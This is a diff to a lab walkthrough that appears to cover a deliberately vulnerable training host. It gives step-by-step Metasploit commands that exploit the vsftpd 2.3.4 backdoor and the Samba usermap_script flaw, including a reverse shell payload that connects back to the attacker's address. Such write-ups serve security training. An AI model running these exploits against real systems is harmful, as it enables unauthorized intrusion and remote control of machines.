@@ -3,7 +3,7 @@ Port 21 vsftpd
 <details>
 <summary>Solution</summary>
 
-```javascript
+```markdown
 search vsftpd
 ```
 
@@ -30,7 +30,7 @@ Now to the exploitation:
 ```markdown
 use exploit/unix/ftp/vsftpd_234_backdoor
 
-set RHOST 10.0.0.3
+set RHOSTS 10.0.0.3
 
 set payload cmd/unix/interact
 
@@ -42,4 +42,40 @@ To verify if the exploit worked use
 ```markdown
 whoami
 ```
+</details>
+
+Port 445 samba
+
+<details>
+<summary>Solution</summary>
+
+```markdown
+use auxiliary/scanner/smb/smb_version
+
+set RHOSTS 10.0.0.3
+
+run
+```
+
+With the information we now have we can use:
+```markdown
+use exploit/multi/samba/usermap_script
+
+set RHOSTS 10.0.0.3
+
+set payload cmd/unix/reverse
+
+set LHOST 10.0.0.2
+
+set RPORT 445
+
+exploit
+```
+
+To verify our access: 
+
+```markdown
+whoami
+```
+
 </details>
